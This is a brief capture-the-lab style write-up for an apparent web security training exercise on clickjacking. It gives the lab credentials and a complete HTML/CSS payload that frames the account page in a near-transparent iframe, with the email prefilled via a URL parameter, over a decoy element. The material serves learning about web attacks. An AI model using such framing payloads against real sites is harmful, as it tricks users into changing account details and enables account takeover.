# Clickjacking with form input prefilled from a URL parameter
* The goal of the lab is to change the examil address of the user by prepopulating a form using a URL parameter and enticing the user to inadvertently click on an "Update email" button.
	* To solve the lab, craft some HTML that frames the account page and fools the user into updating their email address by clicking on a "Click me" decoy. The lab is solved when the email address is changed.
	* You can log in to your own account using the following credentials: `wiener:peter`
### 1. Enumerate the request when the email is changed

### 2. Make a malicious HTML on provided Exploit server
* use the `email` parameter that is found from the request
```html
<style>
    iframe {
        position:relative;
        width:500px;
        height:700px;
        opacity:0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top:300px;
        left:60px;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe src="https://aced1fc41fa69425c0244678007800cf.web-security-academy.net/my-account?email=hacker@pwned.com"></iframe>
```
* Click store and View exploit to adjust the location.
